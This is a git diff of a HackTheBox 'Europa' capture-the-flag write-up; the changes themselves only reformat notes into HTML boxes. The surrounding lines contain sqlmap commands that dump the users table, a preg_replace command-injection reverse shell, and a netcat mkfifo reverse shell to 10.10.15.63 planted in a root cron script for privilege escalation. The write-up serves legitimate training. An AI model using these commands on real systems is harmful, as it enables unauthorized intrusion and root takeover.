@@ -17,8 +17,7 @@ As of 03.11.2017 *Europa* is a retired box at [HackTheBox](https://www.hackthebo
 
 # Outline
 
-> Here is a list of concepts you should be familiar with
-
+Here is a list of concepts you should be familiar with:
 * SQL injections
 * Basic knowledge of PHP functions (**preg_replace()**)
 * Cron    
@@ -148,7 +147,10 @@ SQLmap clearly tells us that the webpage is vulnerable. Chaining these commands 
 * sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" --tables --columns -D admin -T users
 * sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" -D admin -T users --dump password
 
-> Check out [this](http://www.binarytides.com/sqlmap-hacking-tutorial/) cheatsheet if you want to learn SQLmap!
+<div class="notice--info">
+  <h4>Tip:</h4>
+  <p> Check out <a href="http://www.binarytides.com/sqlmap-hacking-tutorial/">this</a> cheatsheet if you want to learn SQLmap! </p>
+</div>
 
 Eventually, SQLmap will obtain password hashes for you which can then be [cracked](https://hashkiller.co.uk/md5-decrypter.aspx).
 ```console
@@ -187,8 +189,10 @@ Feel free to edit out all the giberrish and change the request data to `pattern=
 
 Now it's just the matter changing the system() command parameters and getting a [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). You can approach it in many ways, here is my solution - `system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+yourIP+PORT+>/tmp/f")`!  We use netcat for a reverse shell connection, however because *-e* option is  unavailable, we are forced to use a workaround. Check the reverse shell link above for more information.
 
-> Note: The previous reverse shell is an URL encoded version of the original one, found on pentestmonkey!
-
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>The previous reverse shell is an URL encoded version of the original one, found on pentestmonkey</p>
+</div>
 <img src="/assets/img/blog/htb-europa/htb-europa-11.png">
 
 Baaam!
@@ -234,7 +238,10 @@ exec('/var/www/cmd/logcleared.sh');
 ```
 Clearlogs script clears access.log and **executes** `/var/www/cmd/logcleared.sh` which we have write access to! (OR if the file doesn't exist, create it and chmod 777 it).  Because we can write to the file, we can control what is written in it. Long story short, we can easily control what will be executed as root each time the cron job runs. I just made another reverse shell which connected to me  -  `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.63 5555 >/tmp/f" > /var/www/cmd/logcleared.sh`
 
-> Note: Make sure both netcat connections are connected via a different port, using the same one won’t work.
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>Make sure both netcat connections are connected via a different port, using the same one won’t work.</p>
+</div>
 
 Once the cronjob calls `/var/www/cronjobs/clearlogs` our malicious logcleared.sh file will be executed which will give us a root shell!
 
